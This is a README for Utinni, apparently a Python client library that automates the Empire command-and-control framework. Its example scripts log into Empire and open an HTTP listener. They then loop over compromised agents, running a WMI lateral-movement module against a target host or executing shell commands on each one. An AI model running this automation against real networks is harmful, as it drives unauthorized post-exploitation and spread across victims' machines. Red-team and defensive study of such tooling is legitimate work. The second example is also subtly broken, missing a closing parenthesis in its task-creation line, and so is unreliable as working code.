<p align="center">
  <img src="https://user-images.githubusercontent.com/5151193/107455866-b6778d80-6b0c-11eb-9e7d-14221e2aa582.png" alt="Utinni" height="300"/>
</p>

# Utinni

An async Python client library for Empire's RESTful API (Only works with [BC-Security Empire fork](https://github.com/BC-SECURITY/Empire))

## Installing

`pip3 install utinni`

## Examples

Simple example showing basic usage:

```python
import asyncio
from utinni import EmpireApiClient

async def main():
    # Create client instance
    empire = EmpireApiClient(host="localhost", port="1337")

    # Login to Empire's RESTful API
    await empire.login("username", "password")
    print("* Logged into Empire")

    # Create a listener
    await empire.listeners.create(listener_type="http", name="Utinni", additional={"Port": 8443})

    print("* Waiting for agents...")
    while True:
        # Poll for new agents every 1 sec
        for agent in await empire.agents.get():

            #Print some basic info on the new agent
            print(f"+ New agent '{agent.name}' connected: {agent.domain}\\{agent.username}")

            # Execute a module on the agent
            module_output = await agent.execute(
                    "powershell/lateral_movement/invoke_wmi",
                    options={
                        "ComputerName": "targethost",
                        "Listener": "Utinni",
                    },
                )

            print(f"++ Executed invoke_wmi module on agent '{agent.name}'")
            print(f"++ Module output: {module_output}")

        await asyncio.sleep(1)

# Start the event loop
asyncio.run(main())
```

Example with background tasks:

```python
import asyncio
from utinni import EmpireApiClient

async def agent_poller(empire):
    # Poll for new agents every 1 sec
    print("* Waiting for agents...")
    while True:
        for agent in await empire.agents.get():
            #Print some basic info on the new agent
            print(f"+ New agent '{agent.name}' connected: {agent.domain}\\{agent.username}")

            # Do whatever you want with the agent object here and it won't block the main thread
            # In this example executing we're executing a shell command
            cmd_output = await agent.shell("dir")

            print("++ Executed shell command")
            print(f"++ Output: {cmd_output}")

        await asyncio.sleep(1)

async def main():
    # Create client instance
    empire = EmpireApiClient(host="localhost", port="1337")

    # Login to Empire's RESTful API
    await empire.login("username", "password")
    print("* Logged into Empire")

    # Create a listener
    await empire.listeners.create(listener_type="http", name="Utinni", additional={"Port": 8443})

    # Start the 'agent_poller' coroutine as a background task 
    agent_poller_task = asyncio.create_task(agent_poller(empire)

    # Do more stuff here as this thread isn't blocked.
    available_empire_modules = await empire.modules.get()

    # Wait for the agent_poller_task to complete
    # in this example it won't ever finish since it's in a infinite loop.
    await agent_poller_task

# Start the event loop
asyncio.run(main())
```

## FAQ

**1. Why?**

This was originally made for the [DeathStar](https://github.com/byt3bl33d3r/DeathStar) project, the author then realized it would be useful as a stand-alone library.

**2. Why are there no sync APIs?**

Cause it doesn't make sense. 99% of all use cases you're going to want to call/execute/query/do multiple things at the same time.
